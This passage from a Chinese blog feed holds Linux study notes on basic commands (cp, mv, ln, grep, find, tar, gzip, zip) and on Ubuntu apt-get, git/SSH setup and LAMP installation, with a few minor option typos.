命令</h3><p>将给出的文件或目录复制到另一个文件或目录中。<br>格式：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cp 文件名 目标目录<br></code></pre></div></td></tr></table></figure><h4 id="1-20-1-选项"><a href="#1-20-1-选项" class="headerlink" title="1.20.1 选项"></a>1.20.1 选项</h4><blockquote><ol><li>-a    该选项通常在复制目录时使用，它保留链接、文件属性，并递归地复制目录，简单而言，保持文件原有属性</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-a<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>-f    已经存在的目标文件而不提示</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-f<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>-i    交互式复制，在覆盖目标文件之前将给出提示要求用户确认</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-i<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>-r    若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-r<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>-v    显示拷贝进度</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-v<br></code></pre></div></td></tr></table></figure><h3 id="1-21-mv-命令"><a href="#1-21-mv-命令" class="headerlink" title="1.21 mv 命令"></a>1.21 mv 命令</h3><blockquote><ol><li>移动文件或目录。</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mv 文件 目标目录<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>重命名</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mv 文件名 文件名<br></code></pre></div></td></tr></table></figure><h4 id="1-21-1-参数"><a href="#1-21-1-参数" class="headerlink" title="1.21.1 参数"></a>1.21.1 参数</h4><blockquote><ol><li>-f    禁止交互式操作，如有覆盖也不会给出提示</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-f<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>-i    确认交互方式操作，如果 mv 操作将导致对已存在的目标文件的覆盖，系统会询问是否重写，要求用户回答以避免误覆盖文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-i<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>-v    显示移动进度</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-v<br></code></pre></div></td></tr></table></figure><h3 id="1-22-ln-命令"><a href="#1-22-ln-命令" class="headerlink" title="1.22 ln 命令"></a>1.22 ln 命令</h3><p>建立链接文件，Linux 链接文件类似于Windows下的快捷方式。</p><h4 id="1-22-1-分类"><a href="#1-22-1-分类" class="headerlink" title="1.22.1 分类"></a>1.22.1 分类</h4><h5 id="1-22-1-1-软连接"><a href="#1-22-1-1-软连接" class="headerlink" title="1.22.1.1 软连接"></a>1.22.1.1 软连接</h5><p>软链接不占用磁盘空间，源文件删除则软链接失效。<br>创建：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ln -S 源文件 链接文件<br></code></pre></div></td></tr></table></figure><p>需要注意的是，如果软连接文件和源文件不在同一个目录，源文件要使用绝对路径，不能使用相对路径。</p><h5 id="1-22-1-2-硬链接"><a href="#1-22-1-2-硬链接" class="headerlink" title="1.22.1.2 硬链接"></a>1.22.1.2 硬链接</h5><p>硬链接只能链接普通文件，不能链接目录。<br>创建：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ln 源文件 链接文件<br></code></pre></div></td></tr></table></figure><p>需要注意的是，两个文件占用相同大小的硬盘空间，即使删除了源文件，链接文件还是存在，所以 -s 选项是更常见的形式。</p><h3 id="1-23-grep-命令"><a href="#1-23-grep-命令" class="headerlink" title="1.23 grep 命令"></a>1.23 grep 命令</h3><p>文本搜索，强大的文本搜索工具，grep允许对文本文件进行模式查找，如果找到匹配模式，grep打印包含模式的所有行。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">grep [-选项] ‘搜索内容串’ 文件名<br></code></pre></div></td></tr></table></figure><p>其中，选项有：</p><blockquote><ol><li>-v ：显示不包含匹配文本的所有行（相当于求反）</li><li>-n ：显示匹配行及行号</li><li>-l ：忽略大小写</li></ol></blockquote><h3 id="1-24-find-命令"><a href="#1-24-find-命令" class="headerlink" title="1.24 find 命令"></a>1.24 find 命令</h3><p>查找文件。</p><h4 id="1-24-1-示例"><a href="#1-24-1-示例" class="headerlink" title="1.24.1 示例"></a>1.24.1 示例</h4><blockquote><ol><li>查找当前目录下所有名为 test.sh 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find ./ -name test.sh<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>查找当前目录下所有后缀为 .sh 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&#x27;*.sh&#x27;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>查找当前目录下所有以大写字母开头的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;[A-Z]*&quot;</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>查找在 /tmp 目录下等于 2M 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find /tmp -size 2M<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>查找在 /tmp 目录下大于 2M 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find /tmp -size +2M<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>查找在 /tmp 目录下小于 2M 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find /tmp -size -2M<br></code></pre></div></td></tr></table></figure><blockquote><ol start="7"><li>查找当前目录下大于 4K，小于 5M 的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find ./ -size +4k -size -5M<br></code></pre></div></td></tr></table></figure><blockquote><ol start="8"><li>查找当前目录下权限为 777 的文件或目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">find ./ -perm 0777<br></code></pre></div></td></tr></table></figure><h3 id="1-25-which-命令"><a href="#1-25-which-命令" class="headerlink" title="1.25 which 命令"></a>1.25 which 命令</h3><p>查看命令位置。</p><h3 id="1-26-tar-命令"><a href="#1-26-tar-命令" class="headerlink" title="1.26 tar 命令"></a>1.26 tar 命令</h3><p>归档管理,计算机中的数据经常需要备份, tar 是 Unix/Linux 中最常用的备份工具,此命令可以把一系列文件归档到一个大文件中,也可以把档案文件解开以恢复数据。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tar [参数] 打包文件名 文件<br></code></pre></div></td></tr></table></figure><h4 id="1-26-1-参数"><a href="#1-26-1-参数" class="headerlink" title="1.26.1 参数"></a>1.26.1 参数</h4><blockquote><ol><li> -C ：生成档案文件，创建打包文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-C<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>-v ：列出归档解档的详细过程，显示进度</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-v<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>-f ：指定档案文件名称，f 后面一定是 .tar 文件，所以必须放选项最后</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-f<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>-t ：列出档案中包含的文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-t<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>-x ：解开档案文件</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">-x<br></code></pre></div></td></tr></table></figure><p>需要注意的是，参数前面可以使用 “-“，也可以不使用；除了 f 需要放在参数的最后，其他参数的顺序任意。</p><h3 id="1-27-gzip-命令"><a href="#1-27-gzip-命令" class="headerlink" title="1.27 gzip 命令"></a>1.27 gzip 命令</h3><p>tar 与 gzip 命令结合使用实现文件打包、压缩。tar 只负责打包文件，但不压缩，用 gzip 压缩 tar 打包后的文件，其拓展名一般用 xxxx.tar.gz 。</p><h4 id="1-27-1-解压"><a href="#1-27-1-解压" class="headerlink" title="1.27.1 解压"></a>1.27.1 解压</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gzip [选项] 待解压文件<br></code></pre></div></td></tr></table></figure><h4 id="1-27-2-压缩"><a href="#1-27-2-压缩" class="headerlink" title="1.27.2 压缩"></a>1.27.2 压缩</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gzip [选项] 被压缩文件 压缩后文件名<br></code></pre></div></td></tr></table></figure><h4 id="1-27-3-选项"><a href="#1-27-3-选项" class="headerlink" title="1.27.3 选项"></a>1.27.3 选项</h4><blockquote><ol><li>-f    压缩所有子目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gzip -r 1.tar 1.tar.gz<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>-d    解压</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gzip -d 1.tar.gz<br></code></pre></div></td></tr></table></figure><p>需要注意的是，tar 这个命令并没有压缩的功能，它只是一个打包的命令，但是在 tar 命令中增加一个选项（-z）可以调用 gzip 实现了一个压缩的功能，实行一个先打包后压缩的过程。</p><h4 id="1-27-4-结合-tar"><a href="#1-27-4-结合-tar" class="headerlink" title="1.27.4 结合 tar"></a>1.27.4 结合 tar</h4><h5 id="1-27-4-1-压缩"><a href="#1-27-4-1-压缩" class="headerlink" title="1.27.4.1 压缩"></a>1.27.4.1 压缩</h5><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tar -cvzf 1.tar.gz *<br></code></pre></div></td></tr></table></figure><h5 id="1-27-4-2-解压"><a href="#1-27-4-2-解压" class="headerlink" title="1.27.4.2 解压"></a>1.27.4.2 解压</h5><blockquote><ol><li>解压到当前目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tar -xvzf 1.tar.gz<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>解压到指定目录</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tar -xvzf 1.tar.gz -C /temp<br></code></pre></div></td></tr></table></figure><h3 id="1-28-bzip2-命令"><a href="#1-28-bzip2-命令" class="headerlink" title="1.28 bzip2 命令"></a>1.28 bzip2 命令</h3><p>tar 与 bzip2 命令结合使用实行文件打包、压缩（用法和 gzip 一样）。tar 只负责打包文件，但不压缩，用 bzip2 压缩 tar 打包后的文件，其拓展名一般用 xxxx.tar.gz2 。在 tar 命令中增加一个选项（-j）可以调用 bzip2 实现了一个压缩的功能，实行一个先打包后压缩的过程。</p><h4 id="1-28-1-结合-tar"><a href="#1-28-1-结合-tar" class="headerlink" title="1.28.1 结合 tar"></a>1.28.1 结合 tar</h4><blockquote><ol><li>压缩    tar -jcvf 压缩包包名 文件…</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tar jcvf bk.tar.bz2 *.c<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>解压    tar -jxvf 压缩包包名</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">tar jxvf bk.tar.bz2<br></code></pre></div></td></tr></table></figure><h3 id="1-29-zip、unzip-命令"><a href="#1-29-zip、unzip-命令" class="headerlink" title="1.29 zip、unzip 命令"></a>1.29 zip、unzip 命令</h3><p>通过 zip 压缩文件的目标文件不需要指定扩展名，默认扩展名为 zip。</p><h4 id="1-29-1-压缩"><a href="#1-29-1-压缩" class="headerlink" title="1.29.1 压缩"></a>1.29.1 压缩</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">zip [-r] 目标文件（没有扩展名） 源文件<br></code></pre></div></td></tr></table></figure><h4 id="1-29-2-解压"><a href="#1-29-2-解压" class="headerlink" title="1.29.2 解压"></a>1.29.2 解压</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">unzip -d 解压后目录文件 压缩文件<br></code></pre></div></td></tr></table></figure><h3 id="1-30-gedit-命令"><a href="#1-30-gedit-命令" class="headerlink" title="1.30 gedit 命令"></a>1.30 gedit 命令</h3><p>是一个 Linux 环境下的文本编辑器，类似 Windows 下的写字板程序，在不需要特别复杂的编程环境下，作为基本的文本编辑器比较合适。</p><hr>]]></content>
    
    
    <categories>
      
      <category>Linux学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux学习-Ubuntu基本命令</title>
    <link href="/2021/05/24/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-Ubuntu%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/05/24/Linux%E5%AD%A6%E4%B9%A0/Linux%E5%AD%A6%E4%B9%A0-Ubuntu%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>Linux，全称GNU/Linux，是一种免费使用和自由传播的类UNIX操作系统。主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版。</p><p>Linux不仅系统性能稳定，而且是开源软件。其核心防火墙组件性能高效、配置简单，保证了系统的安全。在很多企业网络中，为了追求速度和安全，Linux不仅仅是被网络运维人员当作服务器使用，甚至当作网络防火墙。Linux具有开放源码、没有版权、技术社区用户多等特点，开放源码使得用户可以自由裁剪，灵活性高，功能强大，成本低。尤其系统中内嵌网络协议栈，经过适当的配置就可实现路由器的功能。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-软件安装与卸载"><a href="#1-软件安装与卸载" class="headerlink" title="1.软件安装与卸载"></a>1.软件安装与卸载</h2><h3 id="1-1-下载"><a href="#1-1-下载" class="headerlink" title="1.1 下载"></a>1.1 下载</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get install<br></code></pre></div></td></tr></table></figure><h4 id="1-1-1-更新源"><a href="#1-1-1-更新源" class="headerlink" title="1.1.1 更新源"></a>1.1.1 更新源</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get update<br></code></pre></div></td></tr></table></figure><h4 id="1-1-2-安装包"><a href="#1-1-2-安装包" class="headerlink" title="1.1.2 安装包"></a>1.1.2 安装包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-3-删除包"><a href="#1-1-3-删除包" class="headerlink" title="1.1.3 删除包"></a>1.1.3 删除包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get remove package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-4-搜索软件包"><a href="#1-1-4-搜索软件包" class="headerlink" title="1.1.4 搜索软件包"></a>1.1.4 搜索软件包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-cache search package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-5-获取包信息"><a href="#1-1-5-获取包信息" class="headerlink" title="1.1.5 获取包信息"></a>1.1.5 获取包信息</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-cache show package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-6-重新安装包"><a href="#1-1-6-重新安装包" class="headerlink" title="1.1.6 重新安装包"></a>1.1.6 重新安装包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install package --reinstall<br></code></pre></div></td></tr></table></figure><h4 id="1-1-7-修复安装"><a href="#1-1-7-修复安装" class="headerlink" title="1.1.7 修复安装"></a>1.1.7 修复安装</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get -f install<br></code></pre></div></td></tr></table></figure><h4 id="1-1-8-删除包（包括配置文件等）"><a href="#1-1-8-删除包（包括配置文件等）" class="headerlink" title="1.1.8 删除包（包括配置文件等）"></a>1.1.8 删除包（包括配置文件等）</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get remove package --purge<br></code></pre></div></td></tr></table></figure><h4 id="1-1-9-安装相关的编译环境"><a href="#1-1-9-安装相关的编译环境" class="headerlink" title="1.1.9 安装相关的编译环境"></a>1.1.9 安装相关的编译环境</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get build-dep package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-10-更新已安装的包"><a href="#1-1-10-更新已安装的包" class="headerlink" title="1.1.10 更新已安装的包"></a>1.1.10 更新已安装的包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get upgrade<br></code></pre></div></td></tr></table></figure><h4 id="1-1-11-升级系统"><a href="#1-1-11-升级系统" class="headerlink" title="1.1.11 升级系统"></a>1.1.11 升级系统</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get dist-upgrade<br></code></pre></div></td></tr></table></figure><h4 id="1-1-12-了解使用改包依赖哪些包"><a href="#1-1-12-了解使用改包依赖哪些包" class="headerlink" title="1.1.12 了解使用改包依赖哪些包"></a>1.1.12 了解使用改包依赖哪些包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-cache depends package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-13-查看该包被哪些包依赖"><a href="#1-1-13-查看该包被哪些包依赖" class="headerlink" title="1.1.13 查看该包被哪些包依赖"></a>1.1.13 查看该包被哪些包依赖</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-cache rdepends package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-14-下载该包的源代码"><a href="#1-1-14-下载该包的源代码" class="headerlink" title="1.1.14 下载该包的源代码"></a>1.1.14 下载该包的源代码</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get <span class="hljs-built_in">source</span> package<br></code></pre></div></td></tr></table></figure><h4 id="1-1-15-清理无用的包"><a href="#1-1-15-清理无用的包" class="headerlink" title="1.1.15 清理无用的包"></a>1.1.15 清理无用的包</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get clean //清理所有软件缓存<br>sudo apt-get autoclean //清理旧版本的软件缓存<br></code></pre></div></td></tr></table></figure><h4 id="1-1-16-检查是否有损坏的依赖"><a href="#1-1-16-检查是否有损坏的依赖" class="headerlink" title="1.1.16 检查是否有损坏的依赖"></a>1.1.16 检查是否有损坏的依赖</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get check<br></code></pre></div></td></tr></table></figure><h2 id="2-Linux下使用git"><a href="#2-Linux下使用git" class="headerlink" title="2.Linux下使用git"></a>2.Linux下使用git</h2><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install git<br></code></pre></div></td></tr></table></figure><h3 id="2-2-配置"><a href="#2-2-配置" class="headerlink" title="2.2 配置"></a>2.2 配置</h3><h4 id="2-2-1-配置用户名"><a href="#2-2-1-配置用户名" class="headerlink" title="2.2.1 配置用户名"></a>2.2.1 配置用户名</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;git注册用户名&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="2-2-2-配置邮箱"><a href="#2-2-2-配置邮箱" class="headerlink" title="2.2.2 配置邮箱"></a>2.2.2 配置邮箱</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config --global user.email <span class="hljs-string">&quot;git注册邮箱&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="2-2-3-生成密钥"><a href="#2-2-3-生成密钥" class="headerlink" title="2.2.3. 生成密钥"></a>2.2.3. 生成密钥</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh-keygen -t rsa -C <span class="hljs-string">&quot;git注册邮箱&quot;</span><br></code></pre></div></td></tr></table></figure><h4 id="2-2-4-GitHub上添加公钥"><a href="#2-2-4-GitHub上添加公钥" class="headerlink" title="2.2.4. GitHub上添加公钥"></a>2.2.4. GitHub上添加公钥</h4><h4 id="2-2-5-验证密钥"><a href="#2-2-5-验证密钥" class="headerlink" title="2.2.5. 验证密钥"></a>2.2.5. 验证密钥</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh -T git@github.com<br></code></pre></div></td></tr></table></figure><h4 id="2-2-6-测试"><a href="#2-2-6-测试" class="headerlink" title="2.2.6. 测试"></a>2.2.6. 测试</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> github地址<br></code></pre></div></td></tr></table></figure><h2 id="3-安装-LAMP-服务"><a href="#3-安装-LAMP-服务" class="headerlink" title="3.安装 LAMP 服务"></a>3.安装 LAMP 服务</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo tasksel install lamp-server<br></code></pre></div></td></tr></table></figure><h2 id="4-查看USB设备"><a href="#4-查看USB设备" class="headerlink" title="4.查看USB设备"></a>4.查看USB设备</h2><figure class="highlight 